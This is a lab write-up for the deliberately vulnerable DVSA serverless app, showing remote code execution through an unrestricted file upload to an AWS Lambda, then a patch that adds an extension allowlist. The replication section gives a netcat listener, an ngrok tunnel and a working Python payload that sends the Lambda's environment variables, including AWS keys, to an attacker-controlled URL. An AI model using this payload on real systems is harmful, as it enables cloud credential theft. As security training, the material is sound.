# DVSA Security Analysis: Remote Code Execution (RCE) via Unrestricted File Upload

**Lesson 4: Insecure Cloud Configuration**.


## ## Setup & Deployment
To deploy the DVSA environment for testing:

1. **AWS Console:** Log in to your AWS account.
2. **Infrastructure:** Use the provided CloudFormation/S3 templates from the DVSA repository to create the `/contact` endpoint and the `DVSA-FEEDBACK-UPLOADS` Lambda.
3. **Connectivity:** Ensure your local machine can receive external traffic by using **ngrok**.

---

## ## Vulnerability Replication (Video 1)
Follow these steps to replicate the RCE vulnerability.

### 1. Prepare the Attack Infrastructure
* **Start a local listener:** Open your terminal and run Netcat to listen for incoming data.
  ```bash
  nc -lvm 8080
  ```
* **Tunnel via Ngrok:** In a separate terminal, expose your local port to the internet.
  ```bash
  ngrok http 8080
  ```
  *Copy the forwarding URL provided (e.g., `https://random-id.ngrok-free.app`).*

### 2. Create the Malicious Payload
Create a file named `cat.png.python3`. This script reads the Lambda environment variables and sends them to your ngrok URL:

```python
import os, base64, urllib.request

# The payload exfiltrates environment variables (including AWS Keys)
env_data = str(os.environ).encode('utf-8')
encoded_data = base64.b64encode(env_data)

url = "https://your-ngrok-url.ngrok-free.app"
req = urllib.request.Request(url, data=encoded_data, method="POST")
urllib.request.urlopen(req)
```

### 3. Trigger the Exploit
* Navigate to the **DVSA Feedback page** (`/contact`).
* Enter "Hacker" in the name field.
* Attach the `cat.png.python3` file using the **Attach File** button.
* Click **Send Feedback**.

### 4. Verification of Success
Check your Netcat terminal. You will see a `POST` request containing a large Base64 string. Use **CyberChef** (From Base64) to decode it.

---

## ## Remediation & Patching (Video 2)
The fix involves enforcing a server-side allowlist for file extensions.

### 1. Technical Implementation
Navigate to the **AWS Lambda Console** and open the `DVSA-FEEDBACK-UPLOADS` function. Locate the `is_safe` helper function. In the vulnerable version, the security check was commented out.

**The Patch:**
Uncomment the validation logic to ensure the function returns `False` if the file extension is not in the approved list (e.g., `.jpg`, `.png`).

```python
def is_safe(filename):
    # Enforce strict extension allowlist
    allowed_extensions = ['.jpg', '.jpeg', '.png', '.gif']
    ext = os.path.splitext(filename)[1].lower()
    
    if ext not in allowed_extensions:
        return False # This blocks .python3, .sh, .php, etc.
    return True

# Implementation in the handler:
if not is_safe(file_name):
    return {
        'status': 'error',
        'message': 'Unsafe file type detected!'
    }
```

### 2. Verification After Fix
* Keep your Netcat and ngrok listeners running.
* Attempt to upload `cat.png.python3` again.
* **Result:** The UI may show a success message (to avoid tipping off an attacker), but check your listeners—**no data is received**. 
* The Lambda now identifies the extension as unsafe and terminates the execution before the script can run.

---

## ## Security Takeaways
* **Never Trust User Input:** Even file names and extensions can be used as attack vectors.
* **Defense in Depth:** S3 buckets should have restricted execution permissions, and Lambda functions must perform strict input validation.
* **Principle of Least Privilege:** If the Lambda execution role didn't have permission to access environment variables or make outbound requests to unknown IPs, the impact of this RCE would have been significantly reduced.
